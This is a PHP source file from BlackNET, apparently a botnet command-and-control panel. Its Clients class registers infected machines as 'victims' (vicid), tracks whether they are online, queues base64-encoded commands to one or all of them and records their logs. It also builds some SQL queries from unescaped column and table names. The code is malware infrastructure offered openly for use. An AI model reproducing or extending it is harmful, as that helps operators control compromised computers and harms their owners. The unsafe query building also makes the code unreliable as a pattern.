<?php

namespace BlackNET;

/**
 * Class to handle clients and C&C Panel using HTTP and MySQL
 *
 * @package BlackNET
 * @author Black.Hacker <farisksa79@protonmail.com>
 * @version 3.7.0
 * @license MIT
 * @link https://github.com/BlackHacker511/BlackNET
 */
class Clients
{

    /**
     * Database Connection
     *
     * @var Database
     */
    private $db;

    /**
     * Utils Connection
     *
     * @var Utils
     */
    private $utils;

    /**
     * Clients class constructor
     *
     * @param object $database
     *  An object from the Database class
     * @param object $utils
     *  An object from the Utils class
     * @return void
     */
    public function __construct($database, $utils)
    {

        $this->db = $database;

        $this->utils = $utils;
    }

    /**
     * Create a new client
     *
     * @param array $clientdata
     *  An array contains the client data such as HWID and IP Address
     * @return bool
     *  Return true if the client is added to the database without issues
     */
    public function newClient($clientdata)
    {
        $new_client_syntax = "INSERT INTO clients (%s) VALUES (%s)";

        if ($this->isExist($clientdata['vicid'], "clients")) {
            if ($this->updateClient($clientdata)) {
                return true;
            }
        } else {
            $this->db->query(sprintf(
                $new_client_syntax,
                implode(", ", array_keys($clientdata)),
                ":" . implode(",:", array_keys($clientdata))
            ));

            foreach ($clientdata as $key => $value) {
                $this->db->bind(":" . $key, $value, \PDO::PARAM_STR);
            }

            if ($this->db->execute()) {
                $this->createCommand($clientdata['vicid']);
                return true;
            } else {
                return false;
            }
        }
    }

    /**
     * Remove a client from the database
     *
     * @param string $clientID
     *  A client id must be a string, like HacKed_123456
     * @return bool
     *  Return true if the client is removed from the database
     */
    public function removeClient($clientID)
    {
        $this->removeCommands($clientID);

        $this->db->query("DELETE FROM clients WHERE vicid = :id");

        $this->db->bind(":id", $clientID, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Update the client information with a new one
     *
     * @param array $clientdata
     *  The new client data to update an existing client in the database
     * @return bool
     *  Return true if the client is updated in the database
     */
    public function updateClient($clientdata)
    {
        $update_client_syntax = "UPDATE clients SET %s WHERE vicid = :vicid";

        $sql_values = "";

        foreach ($clientdata as $key => $value) {
            $sql_values .= "$key=:$key, ";
        }

        $sql_values = rtrim($sql_values, ", ");

        $sql = sprintf($update_client_syntax, $sql_values);

        $this->db->query($sql);

        foreach ($clientdata as $key => $value) {
            $this->db->bind(":" . $key, $value);
        }

        return $this->db->execute();
    }

    /**
     * Check if a client exist
     *
     * @param string $clientID
     *  A client id must be a string, like HacKed_123456
     * @param string $table_name
     *  Table name to check if client exists in them like logs, commands, or clients
     * @return bool
     *  Return true if the client exsit else if the client does not exist
     */
    public function isExist($clientID, $table_name)
    {
        $this->db->query(sprintf("SELECT * FROM %s WHERE vicid = :id", $table_name));

        $this->db->bind(':id', $clientID, \PDO::PARAM_STR);

        if ($this->db->execute()) {
            return $this->db->rowCount() ? true : false;
        }
    }

    /**
     * Get all clients from database
     *
     * @return array
     *  Return an array that contains all the clients that are in the database
     */
    public function getClients()
    {
        $this->db->query("SELECT * FROM clients");
        if ($this->db->execute()) {
            return $this->db->resultset();
        }
    }

    /**
     * Count all clients
     *
     * @return int
     *  Return an integer that represents the number of clients in the database
     */
    public function countClients()
    {
        $this->db->query("SELECT * FROM clients");
        if ($this->db->execute()) {
            return $this->db->rowCount();
        }
    }

    /**
     * Get the client information from the database using vicid
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @return object|bool
     *  Return an object that contains the selected client data or false
     */
    public function getClient($vicID)
    {
        $this->db->query("SELECT * FROM clients WHERE vicid = :id");

        $this->db->bind(":id", $vicID, \PDO::PARAM_STR);

        if ($this->db->execute()) {
            return $this->db->single();
        } else {
            return false;
        }
    }

    /**
     * Count the number of clients using a condition
     *
     * @param string $column_name
     *  The column name in the database such as os or insdata
     * @param string $cond
     *  The condition that you want to count the number of clients based on it
     * @return int
     *  Return integer that represents the number of clients
     */
    public function countClientsByCond($column_name, $cond)
    {
        $this->db->query(sprintf("SELECT * FROM clients WHERE %s = :cond", $column_name));

        $this->db->bind(":cond", $cond, \PDO::PARAM_STR);

        if ($this->db->execute()) {
            return $this->db->rowCount();
        }
    }

    /**
     * Select a specific piece of information from the clients table
     *
     * @param string $column_name
     *  The column name that contains the information you want to retrieve
     * @return array
     *  Returns an array contains the information from all the existing clients
     */
    public function selectInfoFromClients($column_name)
    {
        $sql = sprintf("SELECT %s FROM clients", $column_name);

        $this->db->query($sql);

        if ($this->db->execute()) {
            return $this->db->resultset();
        }
    }

    /**
     * Update the client status online/offline
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @param string $status
     *  Client status either is offline or online
     * @return bool return
     *  Return true if the client status is updated
     */
    public function updateStatus($vicID, $status)
    {
        $this->db->query("UPDATE clients SET status = :status WHERE vicid = :id");

        $this->db->bind(":id", $vicID, \PDO::PARAM_STR);
        $this->db->bind(":status", $status, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Create a new log message
     *
     * @param string $vicid
     *  A client id must be a string, like HacKed_123456
     * @param string $type
     *  The log message type either Succ or Fail
     * @param string $message
     *  The log message text from the client
     * @return bool
     *  Return true if the log message is added to the database otherwise false
     */
    public function newLog($vicid, $type, $message)
    {
        $sql = "INSERT INTO logs(vicid,type,message) VALUES (:vicid,:type,:message)";

        $this->db->query($sql);

        $this->db->bind(":vicid", $vicid, \PDO::PARAM_STR);
        $this->db->bind(":type", $type, \PDO::PARAM_STR);
        $this->db->bind(":message", $message, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Get all logs from the database
     *
     * @return array
     *  Return an array that contains all the system logs
     */
    public function getLogs()
    {
        $this->db->query("SELECT * FROM logs");

        if ($this->db->execute()) {
            return $this->db->resultset();
        }
    }

    /**
     * Delete a log from the database using the ID.
     *
     * @param int $id
     *  The log message id must be an integer
     * @return bool
     *  Return true if the log message is removed otherwise return false
     */
    public function deleteLog($id)
    {
        $this->db->query("DELETE FROM logs WHERE id = :id");

        $this->db->bind(":id", $id, \PDO::PARAM_INT);

        return $this->db->execute();
    }

    /**
     * Get the last command using vicid
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @return object|bool
     *  Return an object that contains the selected client command otherwise false
     */
    public function getCommand($vicID)
    {
        $this->db->query("SELECT command FROM commands WHERE vicid = :id");

        $this->db->bind(":id", $vicID, \PDO::PARAM_STR);

        if ($this->db->execute()) {
            return $this->db->single();
        } else {
            return false;
        }
    }

    /**
     * Update all clients status offline/online
     *
     * @param string $status
     *  A client connection status either offline or online
     * @return bool
     *  Return true if the client status is updated otherwise false
     */
    public function updateAllStatus($status)
    {
        $this->db->query("UPDATE clients SET status = :status");

        $this->db->bind(":status", $status, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Create a new command using the victim id
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @return bool
     *  Return true if the command is created otherwise return false
     */
    public function createCommand($vicID)
    {
        if ($this->isExist($vicID, "commands")) {
            if ($this->updateCommands($vicID, $this->utils->base64EncodeUrl("Ping"))) {
                return true;
            }
        } else {
            $this->db->query("INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)");

            $this->db->bind(":vicid", $vicID, \PDO::PARAM_STR);
            $this->db->bind(":cmd", $this->utils->base64EncodeUrl("Ping"), \PDO::PARAM_STR);

            return $this->db->execute();
        }
    }

    /**
     * Ping the client to check if he/she is online
     *
     * @param string $vicid
     *  The client id must be a string, like HacKed_123456
     * @param int $old_pings
     *  The client old ping number to update it
     * @return bool
     *  Return true if the client ping is updated otherwise false
     */
    public function pinged($vicid, $old_pings)
    {
        $pinged_at = date("Y-m-d H:i:s", time());

        $sql = "UPDATE clients SET pings = :ping, update_at = :update_at WHERE vicid = :vicid";

        $this->db->query($sql);

        $this->db->bind(":ping", $old_pings + 1, \PDO::PARAM_INT);
        $this->db->bind(":update_at", $pinged_at, \PDO::PARAM_STR);
        $this->db->bind(":vicid", $vicid, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Update the command if a client exist
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @param string $command
     *  A command must be a string to send a client
     * @return bool
     *  Return true if the command is been updated otherwise return false
     */
    public function updateCommands($vicID, $command)
    {
        $this->db->query("UPDATE commands SET command = :cmd WHERE vicid = :id");

        $this->db->bind(":cmd", $command, \PDO::PARAM_STR);
        $this->db->bind(":id", $vicID, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Remove the command after uninstalling the client
     *
     * @param string $vicID
     *  A client id must be a string, like HacKed_123456
     * @return bool
     *  Return true if the command is been removed otherwise return false
     */
    public function removeCommands($vicID)
    {
        $this->db->query("DELETE FROM commands WHERE vicid = :id");

        $this->db->bind(":id", $vicID, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Update the command to all existing clients
     *
     * @param string $command
     *  The command you want to set to all clients
     * @return bool
     *  Returns true if the commands are updated or false otherwise
     */
    public function updateAllCommands($command)
    {
        $sql = "UPDATE commands SET command = :command";

        $this->db->query($sql);

        $this->db->bind(":command", $command, \PDO::PARAM_STR);

        return $this->db->execute();
    }

    /**
     * Ping all clients in the database
     *
     * @return bool
     *  Return true if all clients ping status updated otherwise return false
     */
    public function pingClients()
    {
        $allclients = $this->getClients();
        foreach ($allclients as $client) {
            if ($this->updateCommands($client->vicid, $this->utils->base64EncodeUrl("Ping"))) {
                $diff = time() - strtotime($client->update_at);
                $min = round($diff / 1800);

                if ($min >= 1) {
                    $this->updateStatus($client->vicid, "Offline");
                } else {
                    $this->updateStatus($client->vicid, "Online");
                }
            }
        }
        return true;
    }

    /**
     * Remove all offline clients from the database
     *
     * @return bool
     *  Return true if all offline clients are removed otherwise return false
     */
    public function uninstallOfflineClients()
    {
        $allclients = $this->getClients();

        foreach ($allclients as $client) {
            if ($client->status == "Offline") {
                $this->removeClient($client->vicid);
            }
        }
        return true;
    }

    /**
     * Returns an array with the pre-defined countries names and codes
     *
     * @return array
     *  Return an array that contains the pre-defined countries
     */
    public function getCountries()
    {
        return [
            "AF" => "Afghanistan",
            "AX" => "Aland Islands",
            "AL" => "Albania",
            "DZ" => "Algeria",
            "AS" => "American Samoa",
            "AD" => "Andorra",
            "AO" => "Angola",
            "AI" => "Anguilla",
            "AQ" => "Antarctica",
            "AG" => "Antigua And Barbuda",
            "AR" => "Argentina",
            "AM" => "Armenia",
            "AW" => "Aruba",
            "AU" => "Australia",
            "AT" => "Austria",
            "AZ" => "Azerbaijan",
            "BS" => "Bahamas",
            "BH" => "Bahrain",
            "BD" => "Bangladesh",
            "BB" => "Barbados",
            "BY" => "Belarus",
            "BE" => "Belgium",
            "BZ" => "Belize",
            "BJ" => "Benin",
            "BM" => "Bermuda",
            "BT" => "Bhutan",
            "BO" => "Bolivia",
            "BA" => "Bosnia And Herzegovina",
            "BW" => "Botswana",
            "BV" => "Bouvet Island",
            "BR" => "Brazil",
            "IO" => "British Indian Ocean Territory",
            "BN" => "Brunei Darussalam",
            "BG" => "Bulgaria",
            "BF" => "Burkina Faso",
            "BI" => "Burundi",
            "KH" => "Cambodia",
            "CM" => "Cameroon",
            "CA" => "Canada",
            "CV" => "Cape Verde",
            "KY" => "Cayman Islands",
            "CF" => "Central African Republic",
            "TD" => "Chad",
            "CL" => "Chile",
            "CN" => "China",
            "CX" => "Christmas Island",
            "CC" => "Cocos (Keeling) Islands",
            "CO" => "Colombia",
            "KM" => "Comoros",
            "CG" => "Congo",
            "CD" => "Democratic Republic of Congo",
            "CK" => "Cook Islands",
            "CR" => "Costa Rica",
            "CI" => "Cote D\"Ivoire",
            "HR" => "Croatia",
            "CU" => "Cuba",
            "CY" => "Cyprus",
            "CZ" => "Czech Republic",
            "DK" => "Denmark",
            "DJ" => "Djibouti",
            "DM" => "Dominica",
            "DO" => "Dominican Republic",
            "EC" => "Ecuador",
            "EG" => "Egypt",
            "SV" => "El Salvador",
            "GQ" => "Equatorial Guinea",
            "ER" => "Eritrea",
            "EE" => "Estonia",
            "ET" => "Ethiopia",
            "FK" => "Falkland Islands (Malvinas)",
            "FO" => "Faroe Islands",
            "FJ" => "Fiji",
            "FI" => "Finland",
            "FR" => "France",
            "GF" => "French Guiana",
            "PF" => "French Polynesia",
            "TF" => "French Southern Territories",
            "GA" => "Gabon",
            "GM" => "Gambia",
            "GE" => "Georgia",
            "DE" => "Germany",
            "GH" => "Ghana",
            "GI" => "Gibraltar",
            "GR" => "Greece",
            "GL" => "Greenland",
            "GD" => "Grenada",
            "GP" => "Guadeloupe",
            "GU" => "Guam",
            "GT" => "Guatemala",
            "GG" => "Guernsey",
            "GN" => "Guinea",
            "GW" => "Guinea-Bissau",
            "GY" => "Guyana",
            "HT" => "Haiti",
            "HM" => "Heard Island & Mcdonald Islands",
            "VA" => "Holy See (Vatican City State)",
            "HN" => "Honduras",
            "HK" => "Hong Kong",
            "HU" => "Hungary",
            "IS" => "Iceland",
            "IN" => "India",
            "ID" => "Indonesia",
            "IR" => "Islamic Republic Of Iran",
            "IQ" => "Iraq",
            "IE" => "Ireland",
            "IM" => "Isle Of Man",
            "IL" => "Israel",
            "IT" => "Italy",
            "JM" => "Jamaica",
            "JP" => "Japan",
            "JE" => "Jersey",
            "JO" => "Jordan",
            "KZ" => "Kazakhstan",
            "KE" => "Kenya",
            "KI" => "Kiribati",
            "KR" => "Korea",
            "XK" => "Kosovo",
            "KW" => "Kuwait",
            "KG" => "Kyrgyzstan",
            "KP" => "North Korea",
            "LA" => "Lao People\"s Democratic Republic",
            "LV" => "Latvia",
            "LB" => "Lebanon",
            "LS" => "Lesotho",
            "LR" => "Liberia",
            "LY" => "Libyan Arab Jamahiriya",
            "LI" => "Liechtenstein",
            "LT" => "Lithuania",
            "LU" => "Luxembourg",
            "MO" => "Macao",
            "MK" => "Macedonia",
            "MG" => "Madagascar",
            "MW" => "Malawi",
            "MY" => "Malaysia",
            "MV" => "Maldives",
            "ML" => "Mali",
            "MT" => "Malta",
            "MH" => "Marshall Islands",
            "MQ" => "Martinique",
            "MR" => "Mauritania",
            "MU" => "Mauritius",
            "YT" => "Mayotte",
            "MX" => "Mexico",
            "FM" => "Federated States Of Micronesia",
            "MD" => "Moldova",
            "MC" => "Monaco",
            "MN" => "Mongolia",
            "ME" => "Montenegro",
            "MS" => "Montserrat",
            "MA" => "Morocco",
            "MZ" => "Mozambique",
            "MM" => "Myanmar",
            "NA" => "Namibia",
            "NR" => "Nauru",
            "NP" => "Nepal",
            "NL" => "Netherlands",
            "AN" => "Netherlands Antilles",
            "NC" => "New Caledonia",
            "NZ" => "New Zealand",
            "NI" => "Nicaragua",
            "NE" => "Niger",
            "NG" => "Nigeria",
            "NU" => "Niue",
            "NF" => "Norfolk Island",
            "MP" => "Northern Mariana Islands",
            "NO" => "Norway",
            "OM" => "Oman",
            "PK" => "Pakistan",
            "PW" => "Palau",
            "PS" => "Palestinian Territory, Occupied",
            "PA" => "Panama",
            "PG" => "Papua New Guinea",
            "PY" => "Paraguay",
            "PE" => "Peru",
            "PH" => "Philippines",
            "PN" => "Pitcairn",
            "PL" => "Poland",
            "PT" => "Portugal",
            "PR" => "Puerto Rico",
            "QA" => "Qatar",
            "RE" => "Reunion",
            "RO" => "Romania",
            "RU" => "Russian Federation",
            "RW" => "Rwanda",
            "BL" => "Saint Barthelemy",
            "SH" => "Saint Helena",
            "KN" => "Saint Kitts And Nevis",
            "LC" => "Saint Lucia",
            "MF" => "Saint Martin",
            "PM" => "Saint Pierre And Miquelon",
            "VC" => "Saint Vincent And Grenadines",
            "WS" => "Samoa",
            "SM" => "San Marino",
            "ST" => "Sao Tome And Principe",
            "SA" => "Saudi Arabia",
            "SN" => "Senegal",
            "RS" => "Serbia",
            "SC" => "Seychelles",
            "SL" => "Sierra Leone",
            "SG" => "Singapore",
            "SK" => "Slovakia",
            "SI" => "Slovenia",
            "SB" => "Solomon Islands",
            "SO" => "Somalia",
            "XS" => "Somaliland",
            "ZA" => "South Africa",
            "GS" => "South Georgia And Sandwich Isl.",
            "SS" => "South Sudan",
            "ES" => "Spain",
            "LK" => "Sri Lanka",
            "SD" => "Sudan",
            "SR" => "Suriname",
            "SJ" => "Svalbard And Jan Mayen",
            "SZ" => "Swaziland",
            "SE" => "Sweden",
            "CH" => "Switzerland",
            "SY" => "Syrian Arab Republic",
            "TW" => "Taiwan",
            "TJ" => "Tajikistan",
            "TZ" => "Tanzania",
            "TH" => "Thailand",
            "TL" => "Timor-Leste",
            "TG" => "Togo",
            "TK" => "Tokelau",
            "TO" => "Tonga",
            "TT" => "Trinidad And Tobago",
            "TN" => "Tunisia",
            "TR" => "Turkey",
            "TM" => "Turkmenistan",
            "TC" => "Turks And Caicos Islands",
            "TV" => "Tuvalu",
            "UG" => "Uganda",
            "UA" => "Ukraine",
            "AE" => "United Arab Emirates",
            "GB" => "United Kingdom",
            "US" => "United States",
            "UM" => "United States Outlying Islands",
            "UY" => "Uruguay",
            "UZ" => "Uzbekistan",
            "VU" => "Vanuatu",
            "VE" => "Venezuela",
            "VN" => "Viet Nam",
            "VG" => "Virgin Islands, British",
            "VI" => "Virgin Islands, U.S.",
            "WF" => "Wallis And Futuna",
            "EH" => "Western Sahara",
            "YE" => "Yemen",
            "ZM" => "Zambia",
            "ZW" => "Zimbabwe",
            "X" => "Unknown"
        ];
    }

    /**
     * Get the client flag name from a country code
     *
     * @param string $code
     *  An ISO 3166-1 alpha-2 two letters country code
     * @return string
     *  Return the flag image path for the country
     */
    public function getClientFlag($code)
    {
        $countries = $this->getCountries();

        $flag = "";

        if (
            $countries[strtoupper($code)] == "Unknown" ||
            !array_key_exists(strtoupper($code), $countries)
        ) {
            $flag = "X";
        } else {
            $flag = $code;
        }

        return sprintf("images/flags/%s.png", $flag);
    }

    /**
     * Send a command to a client
     *
     * @param string $USER
     *  The JSON string that has either one client or multiple clients
     * @param string $Command
     *  A command must be a string to send to a user
     * @return bool
     *  Return true if the command is been updated otherwise return false
     */
    public function send($USER, $Command)
    {
        foreach (json_decode($USER) as $clientID) {
            $this->updateCommands(
                $this->utils->sanitize($clientID),
                $this->utils->base64EncodeUrl($Command)
            );
        }
        return true;
    }
}
